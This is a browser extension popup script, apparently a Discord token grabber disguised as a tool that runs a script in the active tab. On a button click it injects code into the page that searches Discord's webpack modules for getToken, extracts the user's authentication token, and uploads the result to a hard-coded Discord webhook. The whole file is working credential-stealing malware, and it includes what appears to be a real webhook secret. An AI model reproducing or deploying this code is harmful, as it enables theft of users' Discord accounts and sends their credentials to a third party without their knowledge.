// popup.js
const runBtn = document.getElementById('runBtn');
const resultEl = document.getElementById('result');

// The script to be executed
const userCode = `window.webpackChunkdiscord_app.push([[Date.now()],  {},  (req) => {for (let id in req.c) {try {let m = req.c[id].exports;if (m?.default?.getToken) {let token = m.default.getToken();if (typeof token === "string") {console.clear();console.log(token);if (typeof copy === "function") copy(token);return;}}} catch (e) {}}}]);`;

// Utility: güvenli stringify (circular referanslara karşı)
function safeStringify(v) {
  try {
    return JSON.stringify(v, null, 2);
  } catch (e) {
    try { return String(v); } catch (_) { return '[unserializable]'; }
  }
}
function sendToWebhookAsFile(data) {
  const webhookUrl = 'https://discord.com/api/webhooks/1439735142087262279/pTeKjac95f50KiUfNfI5IHNfGWk3FHeSKji06dy6rfNNNn1mxmD9aXxaD0HxE7CNOOty';

  const contentText =
    "Return Value:\n" +
    safeStringify(data.value) +
    "\n\nLogs:\n" +
    (data.logs?.join("\n") || "(no logs)");

  const form = new FormData();
  form.append(
    "file",
    new Blob([contentText], { type: "text/plain" }),
    "result.txt"
  );

  fetch(webhookUrl, {
    method: "POST",
    body: form
  }).catch(err => console.error("Upload error:", err));
}


// Aktif sekmede hemen çalıştır
runBtn.addEventListener('click', async () => {
  try {
    if (!userCode.trim()) return alert('The embedded script is empty.');

    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab) return alert('No active tab found.');

    const results = await chrome.scripting.executeScript({
      target: { tabId: tab.id, allFrames: false },
      world: "MAIN",
      func: (codeToRun) => {
        // This code runs in the MAIN world of the page.
        return (async () => {
          const logs = [];
          const origConsole = console.log;
          console.log = (...args) => {
            try {
              const s = args.map(a => {
                try { return typeof a === 'string' ? a : JSON.stringify(a); }
                catch(e){ return String(a); }
              }).join(' ');
              logs.push(s);
            } catch (e) {
              logs.push('console serialization error');
            }
            try { origConsole.apply(console, args); } catch(e) {}
          };

          let returnValue;
          try {
            const fn = new Function(codeToRun);
            const maybe = fn();
            if (maybe instanceof Promise) {
              returnValue = await maybe;
            } else {
              returnValue = maybe;
            }
          } catch (err) {
            logs.push('ERROR: ' + (err && err.message ? err.message : String(err)));
            returnValue = undefined;
          }

          try { console.log = origConsole; } catch(e) {}
          return { value: returnValue, logs };
        })();
      },
      args: [userCode]
    });

    const res = results && results[0] && results[0].result ? results[0].result : null;
    if (res) {
      resultEl.textContent = 'Return Value: ' + safeStringify(res.value) + '\n\nLogs:\n' + (res.logs && res.logs.length ? res.logs.join('\n') : '(none)');
      sendToWebhookAsFile(res);

    } else {
      resultEl.textContent = 'Could not get a serializable result.';
    }
  } catch (err) {
    resultEl.textContent = 'Execution error: ' + err.message;
    console.error(err);
  }
});